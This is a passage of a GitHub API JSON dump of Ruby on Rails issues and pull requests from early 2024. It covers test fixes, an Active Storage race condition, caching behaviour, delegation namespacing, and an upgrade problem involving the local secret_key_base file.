7.1.3\r\n\r\n**Ruby version**: 3.2.2",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50930/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50930/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50929",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50929/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50929/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50929/events",
        "html_url": "https://github.com/rails/rails/pull/50929",
        "id": 2111118706,
        "node_id": "PR_kwDNIULOZaAotg",
        "number": 50929,
        "title": "Fix VideoAnalyzerTest#test_analyzing_a_rotated_HDR_video failure with ffmpeg < 5.0",
        "user": {
            "login": "railsbob",
            "id": 43969,
            "node_id": "MDQ6VXNlcjQzOTY5",
            "avatar_url": "https://avatars.githubusercontent.com/u/43969?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/railsbob",
            "html_url": "https://github.com/railsbob",
            "followers_url": "https://api.github.com/users/railsbob/followers",
            "following_url": "https://api.github.com/users/railsbob/following{/other_user}",
            "gists_url": "https://api.github.com/users/railsbob/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/railsbob/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/railsbob/subscriptions",
            "organizations_url": "https://api.github.com/users/railsbob/orgs",
            "repos_url": "https://api.github.com/users/railsbob/repos",
            "events_url": "https://api.github.com/users/railsbob/events{/privacy}",
            "received_events_url": "https://api.github.com/users/railsbob/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-31T22:51:11Z",
        "updated_at": "2024-02-01T02:59:21Z",
        "closed_at": "2024-02-01T02:59:20Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50929",
            "html_url": "https://github.com/rails/rails/pull/50929",
            "diff_url": "https://github.com/rails/rails/pull/50929.diff",
            "patch_url": "https://github.com/rails/rails/pull/50929.patch",
            "merged_at": "2024-02-01T02:59:20Z"
        },
        "body": "### Background\r\n\r\nFixes https://github.com/rails/rails/issues/50924\r\n\r\n### Detail\r\n\r\nBig thanks to @yahonda for explaining the anomaly with `ffprobe` `v4.2.2` versus `v6.0.6`. This change ensures the test works with both versions, similar to how we handle it in `test_analyzing_a_rotated_video`.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50929/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50929/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50928",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50928/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50928/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50928/events",
        "html_url": "https://github.com/rails/rails/pull/50928",
        "id": 2110751556,
        "node_id": "PR_kwDNIULOZZsk5w",
        "number": 50928,
        "title": "Fixes race condition for multiple preprocessed video variants",
        "user": {
            "login": "searls",
            "id": 79303,
            "node_id": "MDQ6VXNlcjc5MzAz",
            "avatar_url": "https://avatars.githubusercontent.com/u/79303?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/searls",
            "html_url": "https://github.com/searls",
            "followers_url": "https://api.github.com/users/searls/followers",
            "following_url": "https://api.github.com/users/searls/following{/other_user}",
            "gists_url": "https://api.github.com/users/searls/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/searls/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/searls/subscriptions",
            "organizations_url": "https://api.github.com/users/searls/orgs",
            "repos_url": "https://api.github.com/users/searls/repos",
            "events_url": "https://api.github.com/users/searls/events{/privacy}",
            "received_events_url": "https://api.github.com/users/searls/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-31T18:49:44Z",
        "updated_at": "2024-02-09T18:17:57Z",
        "closed_at": "2024-02-09T18:17:56Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50928",
            "html_url": "https://github.com/rails/rails/pull/50928",
            "diff_url": "https://github.com/rails/rails/pull/50928.diff",
            "patch_url": "https://github.com/rails/rails/pull/50928.patch",
            "merged_at": null
        },
        "body": "This fixes race condition in Active Storage when multiple preprocessed variants are defined for a `Previewable` file is attached.\r\n\r\n## Background\r\n\r\nWhen a variant is specified for a \"previewable\" file type (e.g. video  or PDF) attachment, a `preview_image` attachment is first created and attached on the original blob and then any user-specified variants are derived from _that_ preview image. When those variants are named and have `preprocessed: true`, the jobs to create those variants are queued simultaneously.\r\n\r\nExample from my case:\r\n\r\n```ruby\r\n  has_one_attached :file, dependent: :purge_later do |attachable|\r\n    attachable.variant :preview, resize_to_fill: [400, 400], preprocessed: true\r\n    attachable.variant :still, format: \"jpg\", saver: {quality: 85}, preprocessed: true\r\n  end\r\n```\r\n\r\n## The issue\r\n\r\nWhen a `Previewable` attachment is created (a video, in my case), `TransformJob.perform_later` is called for each named variant with `preprocessed: true`. Unless your queue adapter is synchronous (e.g. :inline or :test), this results in a race condition in which every such variant's worker will check `processed?`, see that no `preview_image` attachment exists yet on the `ActiveStorage::Blob`, and:\r\n\r\n1. Redundantly download the file from storage\r\n2. Create duplicative ActiveStorage::Attachment and `ActiveStorage::Blob` records for the `preview_image` attachment (all but one of which will be orphaned from the original blob's `has_one_attached :preview_image`)\r\n3. Create variant blobs (and associated `ActiveStorage::VariantRecord`) that are similarly orphaned (by virtue of being a variant of an orphaned `preview_image` blob)\r\n\r\nAs a result, if the video is ever purged, `PurgeJob` will only find the current `has_one_attached :preview_image` and whatever variant demanded it into existence, then leave the rest as orphaned records in the database and in storage.\r\n\r\n## The fix\r\n\r\nPretty simple: wrap the first step of the job in `blob.with_lock {}`. By pessimistically locking on the blob, we can prevent processing the preview image multiple times by multiple `TransformJob` jobs running concurrently.\r\n\r\nAlternate approaches would all be more work:\r\n\r\n* Queuing a `PreviewImage` job instead of N `TransformJob` and have it, only after `preview_image` is attached, enqueue those `TransformJob` jobs\r\n* Batching up all the named variant transformations into a single meta-job\r\n\r\n## Testing caveat \r\n\r\nWriting a test for this inside Rails would be difficult because it would require running the resulting TransformJob jobs concurrently. I [started a test](https://github.com/searls/rails/blob/fix-video-duplicate-preview-variants/activestorage/test/models/variant_with_record_test.rb#L348-L367) but failed to reproduce, in part because the test queue adapter will perform enqueued jobs inline instead of concurrently. In order to write a test that replicated the issue appropriately, we might first need a new option for `perform_enqueued_jobs(async: true) { }`\r\n\r\nIf you're interested, [this gist](https://gist.github.com/searls/5b8298abe88b3206f670ea3c6d574aab) includes a driver script and output before and after the patch showing it working.\r\n\r\n## Evaluating impact on existing Active Storage users\r\n\r\nI only found this because I'm a total cheapskate and was literally counting records in my S3 bucket to ensure `PurgeJob` worked. Then I wasted the next two days trying to figure out why before landing on this. I strongly suspect that ActiveStorage users who host video and take advantage of `preprocessed: true` named variants will have a lot of orphaned stuff floating around their buckets.\r\n\r\nTo see if you have any such \"zombie\" preview_images (and presumably, associated variants) floating around your application that would survive calls to `purge` on the owning attachment, you could write a query like this:\r\n\r\n```\r\nActiveStorage::Attachment\r\n  .joins(\"INNER JOIN active_storage_attachments as other_attachments ON\r\n          active_storage_attachments.record_id = other_attachments.record_id AND\r\n          active_storage_attachments.id != other_attachments.id\")\r\n  .where(\r\n    :name => \"preview_image\",\r\n    :record_type => \"ActiveStorage::Blob\",\r\n    \"other_attachments.name\" => \"preview_image\",\r\n    \"other_attachments.record_type\" => \"ActiveStorage::Blob\"\r\n  )\r\n  .distinct\r\n```\r\n\r\nClearing out one's production database and backend storage to get this all right-sized should be a fun exercise for the reader.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50928/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50928/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50927",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50927/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50927/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50927/events",
        "html_url": "https://github.com/rails/rails/pull/50927",
        "id": 2108798869,
        "node_id": "PR_kwDNIULOZYCHvw",
        "number": 50927,
        "title": "Fix problem with empty strings from cache",
        "user": {
            "login": "laomatt",
            "id": 9632282,
            "node_id": "MDQ6VXNlcjk2MzIyODI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/9632282?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/laomatt",
            "html_url": "https://github.com/laomatt",
            "followers_url": "https://api.github.com/users/laomatt/followers",
            "following_url": "https://api.github.com/users/laomatt/following{/other_user}",
            "gists_url": "https://api.github.com/users/laomatt/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/laomatt/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/laomatt/subscriptions",
            "organizations_url": "https://api.github.com/users/laomatt/orgs",
            "repos_url": "https://api.github.com/users/laomatt/repos",
            "events_url": "https://api.github.com/users/laomatt/events{/privacy}",
            "received_events_url": "https://api.github.com/users/laomatt/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-30T21:16:51Z",
        "updated_at": "2024-02-03T00:54:17Z",
        "closed_at": "2024-02-03T00:54:16Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50927",
            "html_url": "https://github.com/rails/rails/pull/50927",
            "diff_url": "https://github.com/rails/rails/pull/50927.diff",
            "patch_url": "https://github.com/rails/rails/pull/50927.patch",
            "merged_at": null
        },
        "body": "right now the caching won't trigger writing over an empty string returned from the cache store.  This will ensure that an option passed down called no_blanks, (no_blanks: true), will make it so that if the cache returns and empty string, we will trigger a write over.\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nRight now if a key has an empty string from the cache store, an empty string will just be rendered to the page as the fragment.  For my app fragments kept coming up blank, and the writing was not being triggered.  So in a sense it was stuck.  This will ensure that an option passed down called blanks_ok, (blanks_ok: true/false), will make it so that if the cache returns and empty string, we will trigger a write over or it will return the empty string if it is set to true. (the default value is false, must explicitly pass true to get blank strings back)\r\n\r\nThis Pull Request has been created because my app had to way of escaping blank strings being returned from the cache.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the way that caching writes are triggered.\r\n\r\n### Additional information\r\n\r\nFor my app I simply monkey patched the action view helper, but I would like to move away from that and try to contribute bug fixes I found useful.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50927/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50927/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50926",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50926/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50926/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50926/events",
        "html_url": "https://github.com/rails/rails/pull/50926",
        "id": 2108283563,
        "node_id": "PR_kwDNIULOZXl8rg",
        "number": 50926,
        "title": "Add `::` to namespace the module we delegate \"to\"",
        "user": {
            "login": "george-ma",
            "id": 20158582,
            "node_id": "MDQ6VXNlcjIwMTU4NTgy",
            "avatar_url": "https://avatars.githubusercontent.com/u/20158582?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/george-ma",
            "html_url": "https://github.com/george-ma",
            "followers_url": "https://api.github.com/users/george-ma/followers",
            "following_url": "https://api.github.com/users/george-ma/following{/other_user}",
            "gists_url": "https://api.github.com/users/george-ma/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/george-ma/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/george-ma/subscriptions",
            "organizations_url": "https://api.github.com/users/george-ma/orgs",
            "repos_url": "https://api.github.com/users/george-ma/repos",
            "events_url": "https://api.github.com/users/george-ma/events{/privacy}",
            "received_events_url": "https://api.github.com/users/george-ma/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-30T16:32:53Z",
        "updated_at": "2024-01-31T11:28:03Z",
        "closed_at": "2024-01-31T11:28:02Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50926",
            "html_url": "https://github.com/rails/rails/pull/50926",
            "diff_url": "https://github.com/rails/rails/pull/50926.diff",
            "patch_url": "https://github.com/rails/rails/pull/50926.patch",
            "merged_at": "2024-01-31T11:28:02Z"
        },
        "body": "## What are you trying to accomplish?\r\nWe should add `::` to namespace the module we delegate to when the caller is a module. Without the `::`, Ruby will perform relative name resolution which can lead to unexpected behaviour if there are nested constants with the same name.\r\n\r\n@gmcgibbon helped create a code snippet that demonstrates the problem:\r\n\r\n<details><summary>Current (bugged) behaviour `B.a` </summary>\r\n\r\n```ruby\r\nmodule A\r\n  module Delegation\r\n    def self.call(owner)\r\n      owner.module_eval(\"def a; B.a; end\", __FILE__, __LINE__)\r\n    end\r\n  end\r\n\r\n  module B\r\n    def self.a\r\n      raise \"Don't call this.\"\r\n    end\r\n  end\r\nend\r\n\r\nmodule B\r\n  def self.a\r\n    raise \"This should be called.\"\r\n  end\r\nend\r\n\r\nclass C\r\n  A::Delegation.(self)\r\nend\r\n\r\nC.new.a\r\n```\r\n\r\n```\r\n> C.new.a\r\n(irb):10:in `a': Don't call this. (RuntimeError)\r\n```\r\n\r\n</details> \r\n\r\n<details><summary>With this change `::B.a` </summary>\r\n\r\n```ruby\r\nmodule A\r\n  module Delegation\r\n    def self.call(owner)\r\n      owner.module_eval(\"def a; ::B.a; end\", __FILE__, __LINE__)\r\n    end\r\n  end\r\n\r\n  module B\r\n    def self.a\r\n      raise \"Don't call this.\"\r\n    end\r\n  end\r\nend\r\n\r\nmodule B\r\n  def self.a\r\n    raise \"This should be called.\"\r\n  end\r\nend\r\n\r\nclass C\r\n  A::Delegation.(self)\r\nend\r\n\r\nC.new.a\r\n```\r\n\r\n```\r\nC.new.a\r\n(irb):17:in `a': This should be called. (RuntimeError)\r\n```\r\n\r\n</details> \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50926/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50926/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50925",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50925/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50925/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50925/events",
        "html_url": "https://github.com/rails/rails/issues/50925",
        "id": 2107890298,
        "node_id": "I_kwDNIULOfaPaeg",
        "number": 50925,
        "title": "Upgrading Rails 7.0.8 to 7.1.3 broke ActionText attachments in development",
        "user": {
            "login": "airblade",
            "id": 7265,
            "node_id": "MDQ6VXNlcjcyNjU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7265?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/airblade",
            "html_url": "https://github.com/airblade",
            "followers_url": "https://api.github.com/users/airblade/followers",
            "following_url": "https://api.github.com/users/airblade/following{/other_user}",
            "gists_url": "https://api.github.com/users/airblade/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/airblade/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/airblade/subscriptions",
            "organizations_url": "https://api.github.com/users/airblade/orgs",
            "repos_url": "https://api.github.com/users/airblade/repos",
            "events_url": "https://api.github.com/users/airblade/events{/privacy}",
            "received_events_url": "https://api.github.com/users/airblade/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-30T13:37:50Z",
        "updated_at": "2024-01-30T13:38:32Z",
        "closed_at": "2024-01-30T13:38:01Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "After upgrading from 7.0.8 to 7.1.3, images that had been uploaded via ActionText all started 404ing.\r\n\r\nInitially I thought this was due to the [digest changing from SHA1 to SHA256 when Turbo-Rails went to 1.1.1](https://github.com/hotwired/turbo-rails/blob/main/UPGRADING.md#key-digest-changes-in-111) (see also https://github.com/hotwired/turbo-rails/issues/340)  but that was a red herring.  In fact my Turbo-Rails was already past 1.1.1 when I upgraded Rails to 7.1.3.\r\n\r\nEventually I realised the breakage was in fact due to the [`secret_key_base` moving for local environments](https://github.com/rails/rails/pull/48470).\r\n\r\n> In the local environment, both the development and test `secret_key_base` value will be fetched from `tmp/development_secret.txt` (before Rails 7.1) or `tmp/local_secret.txt` (from Rails 7.1). This file will have the value which will be used as `secret_key_base`.\r\n\r\n[Rails 7.1 Store secret_key_base In Credentials For Local Environment](https://blog.saeloun.com/2023/08/11/rails-7-1-store-secret-key-base-in-rails-config/)\r\n\r\nAnd of course for me the two files differed.\r\n\r\nSo the solution is `mv tmp/development_secret.txt tmp/local_secret.txt` in development.\r\n\r\nFortunately production is unaffected because Rails looks elsewhere for the `secret_key_base` value and this did not change.\r\n\r\nI'm posting this here in the hope that it helps anybody else who runs into the same problem.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50925/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50925/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50924",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50924/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50924/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50924/events",
        "html_url": "https://github.com/rails/rails/issues/50924",
        "id": 2107856333,
        "node_id": "I_kwDNIULOfaNVzQ",
        "number": 50924,
        "title": "`ActiveStorage::Analyzer::VideoAnalyzerTest#test_analyzing_a_rotated_HDR_video` fails at Rails Nightly ",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 776781281,
                "node_id": "MDU6TGFiZWw3NzY3ODEyODE=",
                "url": "https://api.github.com/repos/rails/rails/labels/ci%20issues",
                "name": "ci issues",
                "color": "aaafff",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 9,
        "created_at": "2024-01-30T13:22:24Z",
        "updated_at": "2024-02-01T02:59:22Z",
        "closed_at": "2024-02-01T02:59:21Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "Managed to reproduce https://buildkite.com/rails/rails-nightly/builds/108#018d57ac-4e6d-4d11-8741-4a2f6ca84fc8/1165-1205 with Docker, unable to reproduce it locally.\r\n\r\n### Steps to reproduce\r\n```ruby\r\ncd rails\r\ngit clone https://github.com/rails/buildkite-config .buildkite/\r\nRUBY_IMAGE=rubylang/ruby:master-nightly-jammy docker-compose -f .buildkite/docker-compose.yml build base && CI=1 docker-compose -f .buildkite/docker-compose.yml run default runner activestorage 'rake test'\r\n```\r\n\r\n### Expected behavior\r\nIt should pass.\r\n\r\n### Actual behavior\r\nIt gets this failure.\r\n\r\n```ruby\r\nFailure:\r\nActiveStorage::Analyzer::VideoAnalyzerTest#test_analyzing_a_rotated_HDR_video [test/analyzer/video_analyzer_test.rb:38]:\r\nExpected: -90\r\n  Actual: 90\r\n\r\n\r\nbin/rails test /rails/activestorage/test/analyzer/video_analyzer_test.rb:32\r\n```\r\n### System configuration\r\n**Rails version**: main branch\r\n\r\n**Ruby version**: ruby 3.4.0dev (2024-01-29T08:16:49Z master 8bff7e996c) [x86_64-linux]\r\n```\r\n$ docker run --rm -t rubylang/ruby:master-nightly-jammy ruby -v\r\nruby 3.4.0dev (2024-01-29T08:16:49Z master 8bff7e996c) [x86_64-linux]\r\n```\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50924/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50924/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50923",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50923/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50923/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50923/events",
        "html_url": "https://github.com/rails/rails/pull/50923",
        "id": 2107745328,
        "node_id": "PR_kwDNIULOZXInow",
        "number": 50923,
        "title": "BacktraceCleaner silence core internal methods by default",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-01-30T12:26:31Z",
        "updated_at": "2024-02-05T08:26:06Z",
        "closed_at": "2024-01-30T12:42:24Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50923",
            "html_url": "https://github.com/rails/rails/pull/50923",
            "diff_url": "https://github.com/rails/rails/pull/50923.diff",
            "patch_url": "https://github.com/rails/rails/pull/50923.patch",
            "merged_at": "2024-01-30T12:42:24Z"
        },
        "body": "Ref: https://bugs.ruby-lang.org/issues/20227\r\n\r\nIn recent Ruby versions some pure C functions have been moved into some semi-ruby code and now have an `<internal:something>` location.\r\n\r\nThey should be silenced like stdlib etc.\r\n\r\ncc @yahonda ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50923/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50923/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50922",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50922/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50922/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50922/events",
        "html_url": "https://github.com/rails/rails/pull/50922",
        "id": 2107646665,
        "node_id": "PR_kwDNIULOZXDCoQ",
        "number": 50922,
        "title": "Fix loading schema cache when all databases have disabled database tasks",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
